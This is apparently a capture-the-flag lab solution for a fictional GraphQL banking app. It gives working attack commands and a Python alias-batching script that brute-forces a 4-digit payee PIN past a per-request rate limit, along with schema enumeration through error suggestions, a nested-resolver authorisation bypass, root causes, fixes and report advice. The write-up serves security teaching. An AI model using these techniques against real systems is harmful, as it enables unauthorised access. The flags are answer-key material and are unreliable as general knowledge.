# Solution — Orion Treasury

Full spoilers.

Set up a session first; every request below uses it:

```bash
curl -s -c jar -X POST http://localhost:8086/session \
  -H 'Content-Type: application/json' \
  -d '{"login":"treasury@northgate-mills.example","password":"Orion-Treasury-2026"}'

gql() {
  curl -s -b jar -X POST http://localhost:8086/graphql \
    -H 'Content-Type: application/json' -d "{\"query\":\"$1\"}"
}
```

## Confirming introspection really is off

```bash
gql '{ __schema { types { name } } }'
```

```json
{"errors":[{"message":"GraphQL introspection has been disabled, but the requested query contained the field \"__schema\"."}]}
```

Genuinely disabled — this is `NoSchemaIntrospectionCustomRule`, the rule
graphql-js ships for exactly this. No `__type` fallback, no GET-vs-POST
trick, no alternate path. Map it a different way.

## Objective 1 — `HxBugLabs{d1d_y0u_m34n_th3_wh0l3_schem4}`

### The bug

Introspection is one way GraphQL describes itself. **Validation errors
are the other one, and they are almost never turned off.**

```bash
gql '{ viewer { nam } }'
```

```json
{"errors":[{"message":"Cannot query field \"nam\" on type \"Customer\". Did you mean \"name\"?"}]}
```

Three facts leaked from one malformed query: the type `viewer` returns is
called `Customer`, that type has a field `name`, and the server is willing
to correct your spelling.

That is the whole primitive. `clairvoyance` industrialises it: throw a
wordlist at the endpoint one candidate at a time, harvest every
`Did you mean` and rebuild the schema from the answers.

```bash
pip install clairvoyance
clairvoyance -o schema.json -w wordlist.txt http://localhost:8086/graphql \
  -H 'Cookie: connect.sid=…'
```

### Doing it by hand, and why it works

The suggestion is not a substring match. graphql-js computes a lexical
(Damerau-Levenshtein) distance and only suggests within a threshold of:

```
floor(input.length * 0.4) + 1
```

That single formula tells you how to drive it:

- **Short inputs get you nothing.** `recon` is 5 characters, so the
  threshold is 3 — and `reconciliationBatch` is 14 edits away. Silence.
- **Longer, closer inputs pay.** `reconciliation` is 14 characters,
  threshold 6, and the real field is 5 edits away:

```bash
gql '{ reconciliation }'
```

```json
{"errors":[{"message":"Cannot query field \"reconciliation\" on type \"Query\". Did you mean \"reconciliationBatch\"?"}]}
```

So the words that work are **full-length domain terms**, not stubs — which
is why clairvoyance ships wordlists of real English and API vocabulary
rather than fuzzing character by character. Against a banking API, terms
like `reconciliation`, `settlement`, `mandate`, `beneficiary` and
`counterparty` are exactly what you feed it.

Once you have a field name, enumerate its arguments and its return type
the same way — the error messages carry both:

```bash
gql '{ reconciliationBatch { id } }'
# "Field \"reconciliationBatch\" argument ... " and the type name in the message
```

### Exploiting it

```bash
gql '{ reconciliationBatch(period: \"2026-02\") { id period rowCount exportToken } }'
```

```json
{"data":{"reconciliationBatch":{
  "id":"RECON-2026-02-A","period":"2026-02","rowCount":4418,
  "exportToken":"HxBugLabs{d1d_y0u_m34n_th3_wh0l3_schem4}"}}}
```

A query the console has no screen for, reachable by any authenticated
customer, returning an export token for the whole month's reconciliation
batch.

### Root cause

**Disabling introspection is not access control, it is a speed bump.**
The schema is still fully enumerable through validation errors, and the
operations behind it still have to authorise their own callers. Here
`reconciliationBatch` has no authorisation at all: it was written for a
batch job, and "the UI never calls it" was treated as the control.

If your goal really is to hide the schema (a reasonable defence in depth,
not a fix), you need all three:

1. Introspection off.
2. `didYouMean` suggestions off — in graphql-js, wrap validation or strip
   the suggestion text from error messages before they leave the server.
3. **Persisted queries.** Ship the front end's operation hashes and reject
   anything not on the list. This is the only one that actually closes the
   endpoint, because it stops arbitrary documents rather than trying to
   keep the schema secret.

And regardless of all three: authorise every resolver, because none of the
above is a boundary.

## Objective 2 — `HxBugLabs{4l14s3s_4r3_fr33_r3qu3sts_4r3_n0t}`

### The bug

Confirming a payee needs a four-digit PIN, and the limiter is real:

```bash
for i in $(seq 12); do
  gql 'mutation { confirmPayee(payeeId: \"PAYEE-771\", pin: \"0000\") { ok message } }'
done
```

```
incorrect PIN ×10, then:
{"errors":[{"message":"too many PIN attempts, try again in a minute"}]}
```

Ten attempts per minute, enforced per session. Now read where it is
enforced (`server.js`):

```js
if (/confirmPayee/.test(query) && !underRateLimit(req.sessionID)) {
  return res.status(429).json(...);
}
const result = await execute({ schema, document, ... });
```

The check runs **once per HTTP request**, before execution. But a GraphQL
document is not one operation — aliases let the same field appear as many
times as you like in a single document, and each one runs the resolver:

```graphql
mutation {
  a0000: confirmPayee(payeeId: "PAYEE-771", pin: "0000") { ok }
  a0001: confirmPayee(payeeId: "PAYEE-771", pin: "0001") { ok }
  ...
}
```

One request, one increment of the counter, ten thousand resolver calls.

### Exploiting it

The whole keyspace fits in one 800 KB body:

```python
import json, urllib.request

aliases = "\n".join(
    f'  a{n}: confirmPayee(payeeId: "PAYEE-771", pin: "{n:04d}") {{ ok confirmationToken }}'
    for n in range(10000)
)
doc = "mutation {\n" + aliases + "\n}"

req = urllib.request.Request(
    "http://localhost:8086/graphql",
    data=json.dumps({"query": doc}).encode(),
    headers={"Content-Type": "application/json", "Cookie": "connect.sid=…"},
)
data = json.loads(urllib.request.urlopen(req).read())
print({k: v for k, v in data["data"].items() if v and v["ok"]})
```

```
{'a8213': {'ok': True, 'confirmationToken': 'HxBugLabs{4l14s3s_4r3_fr33_r3qu3sts_4r3_n0t}'}}
```

One request. The alias name tells you the PIN: **8213**.

### Root cause

The limiter counts the wrong unit. It counts *requests*; the thing worth
limiting is *resolver invocations*. This is the single most common
GraphQL-specific rate-limit bypass, and it generalises past PINs: OTP
verification, coupon redemption, password checks, invite acceptance,
anything where the security model assumed one attempt per round trip.

Real fixes:

- Count in the resolver, not the middleware — one increment per
  `confirmPayee` execution.
- Cap document complexity: reject documents above a depth/breadth budget
  (`graphql-query-complexity`, `graphql-depth-limit`), which also blunts
  DoS-by-nesting.
- Persisted queries again — the front end never sends 10,000 aliases, so
  an allow-list rejects the document outright.
- And treat a four-digit secret as brute-forceable by construction. Lock
  the *payee* after N failures, not the minute.

Worth testing on every GraphQL target you meet, in this order: aliases on
the same field, then `@include`/`@skip` directive abuse, then batched
arrays (`[{query:…},{query:…}]`) if the server accepts them.

## Objective 3 — `HxBugLabs{4uthz_0n_th3_3dg3_n0t_th3_n0d3}`

### The bug

The direct lookup is properly guarded:

```bash
gql '{ counterparty(id: \"CP-2288\") { name riskNotes } }'
```

```json
{"data":{"counterparty":null},
 "errors":[{"message":"counterparty lookup requires the compliance role","path":["counterparty"]}]}
```

Your tier is `corporate`, so that resolver refuses you. But the check
lives on the **query field**, not on the `Counterparty` type — and there
is a second path to that type. Your own account's transactions each
resolve a `counterparty`:

```js
const Transaction = new GraphQLObjectType({
  fields: () => ({
    counterparty: {
      type: Counterparty,
      resolve: (tx) => byId(counterparties, tx.counterpartyId),   // no check
    },
  }),
});
```

### Exploiting it

```bash
gql '{ account(id: \"ACC-88120\") { label transactions { reference counterparty { name complianceRef riskNotes } } } }'
```

```json
"counterparty": {
  "name": "Kestrel Bioscience Holdings",
  "complianceRef": "KYC-LU-2024-0117",
  "riskNotes": "Enhanced due diligence: politically exposed director. Case reference HxBugLabs{4uthz_0n_th3_3dg3_n0t_th3_n0d3}"
}
```

Every field the compliance role was supposed to gate, reached through an
account you legitimately own.

### Root cause

**Authorisation on the edge, not on the node.** GraphQL is a graph: a type
can be reached from any field that returns it, and the number of paths
grows every time someone adds a relation. Guarding one entry point guards
one entry point.

The structural fix is to authorise where the data is, not where the query
started:

- Field-level authorisation on the type itself, so `riskNotes` checks the
  caller's role no matter which path arrived there.
- Or field-level scoping: `complianceRef` and `riskNotes` live on a
  separate type only reachable from a guarded query.
- Pass the viewer through context and check it in the resolver that
  actually returns sensitive data — never in the resolver that happens to
  be first.

On a real target this is the highest-yield GraphQL bug class after
missing object-level authorisation, and you find it the same way every
time: **for every type you can see, enumerate every field that returns
it, and try each path.** A type that is guarded on one route and open on
another is the normal state of a large schema, not the exception.

## Notes for the report

Three findings, three severities, and they should not be merged:

- **Objective 1** — missing authorisation on an undocumented query
  exposing month-end reconciliation data. Medium-to-High on data
  sensitivity. Mention that introspection is disabled and explain how you
  mapped it anyway; otherwise a triager assumes you had inside knowledge.
- **Objective 2** — rate-limit bypass via alias batching leading to full
  compromise of a 4-digit payment PIN. High. The report is one request
  and one response; include the request count (**one**), because that is
  what makes it undeniable.
- **Objective 3** — broken object-level authorisation on `Counterparty`
  via a nested resolver. High, and the cleanest of the three to
  demonstrate: paste the refused direct query next to the successful
  nested one.

For all three, say explicitly which account you used and that it holds no
elevated role. GraphQL findings get closed as "working as intended" more
than most, and the thing that prevents that is showing the same data being
refused on one path and served on another.
